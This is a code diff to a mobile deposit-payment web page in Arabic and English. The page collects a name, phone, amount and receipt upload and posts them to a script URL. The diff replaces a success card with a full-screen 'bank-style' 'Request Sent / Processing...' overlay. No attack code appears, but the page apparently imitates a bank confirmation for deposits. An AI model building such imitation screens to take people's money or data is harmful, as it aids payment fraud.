@@ -20,7 +20,7 @@
         }
 
         body { margin: 0; padding: 0; font-family: 'Cairo', sans-serif; background-color: var(--bg-gray); display: flex; flex-direction: column; align-items: center; }
-        .main-container { width: 100%; max-width: 480px; min-height: 100vh; display: flex; flex-direction: column; }
+        .main-container { width: 100%; max-width: 480px; min-height: 100vh; display: flex; flex-direction: column; position: relative; }
 
         .top-header { 
             height: 70px; background-color: var(--header-green); 
@@ -102,7 +102,6 @@
         .info-row-detail .label { font-size: 10px; font-weight: 700; color: #999; }
         .info-row-detail .value { font-size: 14px; font-weight: 600; color: #000; }
 
-        /* Loader inside user details */
         #user-details-loader {
             display: none;
             text-align: center;
@@ -229,35 +228,52 @@
         .pay-submit-btn:active { opacity: 0.8; }
         .amount-hint { font-size: 11px; color: #888; margin-top: -5px; padding: 0 2px; }
 
-        /* Success Interface Styles */
-        #success-interface {
+        /* Bank-style Success Overlay */
+        #success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            z-index: 9999;
             display: none;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 40px 20px;
             text-align: center;
-            background: #fff;
-            border-radius: 20px;
-            margin: 20px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
         }
-        .success-icon-circle {
-            width: 80px;
-            height: 80px;
-            background: #e8f5e9;
+        .bank-success-icon {
+            width: 100px;
+            height: 100px;
+            background-color: #e8f5e9;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            animation: scaleUp 0.5s ease-out;
         }
-        .success-icon-circle i {
-            font-size: 40px;
-            color: #4caf50;
+        .bank-success-icon i {
+            color: #2e7d32;
+            font-size: 50px;
         }
-        .success-title { font-size: 22px; font-weight: 800; color: #2e5822; margin-bottom: 10px; }
-        .success-msg { font-size: 14px; color: #666; font-weight: 600; line-height: 1.6; }
+        .bank-success-text {
+            font-size: 20px;
+            font-weight: 800;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .bank-processing-text {
+            font-size: 15px;
+            color: #777;
+            font-weight: 600;
+        }
+        @keyframes scaleUp {
+            0% { transform: scale(0); opacity: 0; }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
     </style>
 </head>
 <body class="notranslate" translate="no">
@@ -369,18 +385,14 @@
             </button>
 
         </div>
+    </div>
 
-        <div id="success-interface">
-            <div class="success-icon-circle">
-                <i class="fas fa-check"></i>
-            </div>
-            <div class="success-title" id="success-title-text">تمت العملية بنجاح</div>
-            <div class="success-msg" id="success-msg-text">
-                لقد تم استلام طلب الإيداع الخاص بك.<br>
-                سيتم مراجعة البيانات وتحديث رصيدك قريباً.
-            </div>
+    <div id="success-overlay">
+        <div class="bank-success-icon">
+            <i class="fas fa-check"></i>
         </div>
-
+        <div class="bank-success-text" id="bank-title">تم إرسال الطلب</div>
+        <div class="bank-processing-text" id="bank-sub">قيد المعالجة...</div>
     </div>
 
     <script type="module">
@@ -515,11 +527,13 @@
                 document.getElementById('lbl-phone').innerText = "Phone";
                 document.getElementById('lbl-reason').innerText = "Code";
                 payBtn.querySelector('span').innerText = "Confirm Deposit";
-                document.getElementById('success-title-text').innerText = "Success!";
-                document.getElementById('success-msg-text').innerHTML = "Your deposit request has been received.<br>Your balance will be updated soon.";
+                document.getElementById('bank-title').innerText = "Request Sent";
+                document.getElementById('bank-sub').innerText = "Processing...";
             } else {
                 dynamicSection.style.direction = 'rtl';
                 subHeader.innerText = "إتمام الدفع بإستخدام serviocmm";
+                document.getElementById('bank-title').innerText = "تم إرسال الطلب";
+                document.getElementById('bank-sub').innerText = "قيد المعالجة...";
             }
         }
         
@@ -531,7 +545,6 @@
             const amount = document.getElementById('amount-input').value;
             const fileInput = document.getElementById('file-input');
             
-            // If fields are empty, do nothing (no response/alert as requested)
             if (!fullname || !amount || fileInput.files.length === 0) {
                 return;
             }
@@ -551,9 +564,7 @@
 
                 try {
                     await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: formData });
-                    // Switch interface to success view
-                    document.getElementById('dynamic-section').style.display = 'none';
-                    document.getElementById('success-interface').style.display = 'flex';
+                    document.getElementById('success-overlay').style.display = 'flex';
                 } catch (e) {
                     payBtn.disabled = false;
                     payBtn.innerHTML = '<span>تأكيد الإيداع</span>';
